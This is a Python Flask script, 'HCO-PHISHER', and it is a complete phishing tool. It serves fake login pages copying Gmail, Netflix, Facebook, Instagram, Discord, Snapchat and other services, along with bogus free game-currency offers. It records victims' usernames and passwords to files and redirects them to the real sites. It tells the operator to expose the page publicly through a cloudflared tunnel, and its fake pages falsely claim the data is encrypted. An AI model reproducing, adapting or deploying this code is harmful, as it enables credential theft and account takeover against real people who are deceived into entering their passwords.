import os
import time
import threading
from flask import Flask, request, redirect
from datetime import datetime
from pyfiglet import figlet_format

R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
B = '\033[94m'
P = '\033[95m'
C = '\033[96m'
W = '\033[97m'
N = '\033[0m'

app = Flask(__name__)
clear = lambda: os.system('cls' if os.name == 'nt' else 'clear')

def show_banner(text, color):
    clear()
    banner = figlet_format(text)
    print(f"{color}{banner}{N}")

def hackers_colony_banner():
    show_banner("HCO-TEAM", R)
    print(f"{C}────────────────────────────────────────────────────────────")
    print(f"{G} THIS TOOL IS PAID! TO USE IT FOR FREE:")
    print(f"{P} SUBSCRIBE TO OUR CHANNEL FOR ETHICAL HACKING TUTORIALS!")
    print(f"{B} https://youtube.com/@hackers_colony_tech?si=Bvtvh4QGUY7nEFGK")
    print(f"{C}────────────────────────────────────────────────────────────{N}")
    time.sleep(2)
    os.system("termux-open-url https://youtube.com/@hackers_colony_tech?si=Bvtvh4QGUY7nEFGK")
    input(f"{Y}Press Enter after subscribing to continue...{N}")
    clear()

def hco_phisher_banner():
    show_banner("HCO-PHISHER", B)
    print(f"{C}────────────────────────────────────────────────────────────")
    print(f"{G} FAST & POWERFUL SOCIAL MEDIA HACK")
    print(f"{Y} Developed by: HACKERS-COLONY TEAM | High Performance")
    print(f"{Y} Coded by: ALI SABRI ")
    print(f"{C}────────────────────────────────────────────────────────────{N}")

# Basic HTML Template Generator
def generate_html(title, logo_url, username_placeholder, extra_fields=""):
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>{title}</title>
  <style>
    body {{
      background: #f1f1f1;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }}
    .container {{
      background: #fff;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 0 20px rgba(0,0,0,0.2);
      text-align: center;
      width: 90%;
      max-width: 400px;
    }}
    .container img {{
      width: 70px;
      margin-bottom: 15px;
    }}
    input {{
      width: 90%;
      padding: 12px;
      margin: 10px 0;
      border-radius: 8px;
      border: 1px solid #ccc;
      font-size: 16px;
    }}
    button {{
      width: 95%;
      padding: 12px;
      background: #333;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
    }}
    button:hover {{
      background: #555;
    }}
    .note {{
      font-size: 12px;
      color: #777;
      margin-top: 10px;
    }}
  </style>
</head>
<body>
  <div class="container">
    <img src="{logo_url}" alt="Logo">
    <h2>{title}</h2>
    <form method="POST">
      <input type="text" name="username" placeholder="{username_placeholder}" required>
      <input type="password" name="password" placeholder="Password" required>
      {extra_fields}
      <button type="submit">Login</button>
    </form>
    <div class="note">This is a secure login page. Your data is encrypted.</div>
  </div>
</body>
</html>"""

platforms = {
    "Gmail": {
        "redirect": "https://mail.google.com",
        "placeholder": "Email Address",
        "html": generate_html("Gmail Login", "https://ssl.gstatic.com/ui/v1/icons/mail/rfr/gmail.ico", "Email Address")
    },
    "Free Fire - Diamonds": {
        "redirect": "https://freefiremobile.com",
        "placeholder": "Free Fire ID",
        "html": generate_html("Free Fire Diamonds", "https://cdn-icons-png.flaticon.com/512/831/831276.png", "Player ID", '<input type="number" name="extra" placeholder="Diamond Amount" required>')
    },
    "BGMI - Free UC": {
        "redirect": "https://www.battlegroundsmobileindia.com",
        "placeholder": "BGMI Username",
        "html": generate_html("BGMI UC Generator", "https://cdn-icons-png.flaticon.com/512/732/732228.png", "BGMI Username", '<input type="number" name="extra" placeholder="UC Amount" required>')
    },
    "Netflix": {
        "redirect": "https://www.netflix.com",
        "placeholder": "Email or Phone",
        "html": generate_html("Netflix Login", "https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.png", "Email or Phone")
    },
    "Twitter": {
        "redirect": "https://twitter.com",
        "placeholder": "Twitter Username",
        "html": generate_html("Twitter Login", "https://cdn-icons-png.flaticon.com/512/733/733579.png", "Username or Email")
    },
    "Facebook": {
        "redirect": "https://facebook.com",
        "placeholder": "Phone or Email",
        "html": generate_html("Facebook Login", "https://cdn-icons-png.flaticon.com/512/124/124010.png", "Email or Mobile")
    },
    "Instagram": {
        "redirect": "https://instagram.com",
        "placeholder": "Instagram Username",
        "html": generate_html("Instagram Login", "https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png", "Instagram Username")
    },
    "Discord": {
        "redirect": "https://discord.com",
        "placeholder": "Discord Email",
        "html": generate_html("Discord Login", "https://cdn.worldvectorlogo.com/logos/discord-6.svg", "Email or Username")
    },
    "Snapchat": {
        "redirect": "https://snapchat.com",
        "placeholder": "Snapchat Username",
        "html": generate_html("Snapchat Login", "https://upload.wikimedia.org/wikipedia/en/a/ad/Snapchat_logo.svg", "Username")
    },
    "Pinterest": {
        "redirect": "https://pinterest.com",
        "placeholder": "Email or Username",
        "html": generate_html("Pinterest Login", "https://cdn-icons-png.flaticon.com/512/733/733646.png", "Email or Username")
    },
}

def run_phishing(platform_data, port, platform_name):
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    victim_file = f"victim-{platform_name.replace(' ', '_')}-{timestamp}.txt"

    @app.route("/", methods=["GET", "POST"])
    def login():
        if request.method == "POST":
            username = request.form.get("username", "N/A")
            password = request.form.get("password", "N/A")
            extra = request.form.get("extra", "")

            log = f"[{datetime.now()}] {platform_name} | Username: {username} | Password: {password}"
            if extra:
                log += f" | Extra: {extra}"
            log += "\n"

            print(f"\n\033[1;32m[+] {log.strip()}\033[0m")

            with open(victim_file, "a", encoding="utf-8") as f:
                f.write(log)

            return redirect(platform_data["redirect"])
        return platform_data["html"]

    app.run(host="0.0.0.0", port=port)

def main():
    hackers_colony_banner()
    hco_phisher_banner()

    print(f"{Y}Select a platform:{N}")
    keys = list(platforms.keys())
    for i, name in enumerate(keys, 1):
        print(f"{C}[{i}] {name}{N}")

    try:
        choice = int(input(f"\n{Y}Your choice: {N}"))
        platform_name = keys[choice - 1]
        platform_data = platforms[platform_name]
    except (ValueError, IndexError):
        print(f"{R}Invalid choice. Exiting...{N}")
        return

    port = input(f"{C}Enter port (default 5000): {N}").strip()
    if not port:
        port = "5000"

    clear()
    print(f"\n{G}Launching phishing page for:{N} {platform_name}")
    print(f"{B}Using port:{N} {port}")

    threading.Thread(target=run_phishing, args=(platform_data, int(port), platform_name)).start()

    print(f"\n{Y}Now open a new session and run:{N}")
    print(f"{G}cloudflared tunnel --url http://localhost:{port}{N}")
    print(f"\n{Y}Waiting for credentials... Press CTRL+C to stop.{N}")

if __name__ == "__main__":
    main()
